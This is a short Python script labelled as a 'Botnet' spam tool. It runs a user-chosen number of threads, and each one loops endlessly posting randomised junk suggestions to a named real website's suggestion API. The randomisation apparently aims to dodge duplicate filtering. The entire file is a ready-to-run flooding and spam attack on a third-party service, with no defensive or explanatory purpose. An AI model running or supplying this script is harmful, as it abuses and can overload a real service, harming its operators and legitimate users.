import requests
import threading
from time import sleep
import random
print("\"Botnet\" Spam\n(will be delayed because of website response time)")
titles=["ez spam", "wow", "lol", "^_^"]
msgs=["ez spam", "wow", "lol", "^_^"]
additions=["!", ">", "<", ",", ".", "@", "&", "*"]
num = []
for n in range((100+1)):
  num.append(str(n))
def send():
  while True:
    _title = random.choice(titles)
    _msg = random.choice(msgs)
    title = random.choice(additions) + random.choice(num) + _title
    msg = random.choice(additions) + random.choice(num) + _msg
    r = requests.post(f"https://ezfn.dev/api/suggestion/suggestion?title={title}&description={msg}")
    sleep(0.01)
    print(f"[*] Sent request. Title: {title}, Message: {msg}")
threads = []
amt = int(input("[?] How many threads? > "))
for _ in range((amt+1)):
  t = threading.Thread(target=send, args=())
  threads.append(t)
c = 0
for t in threads:
  c+=1
  t.start()
  print(f"[*] Started thread {c}")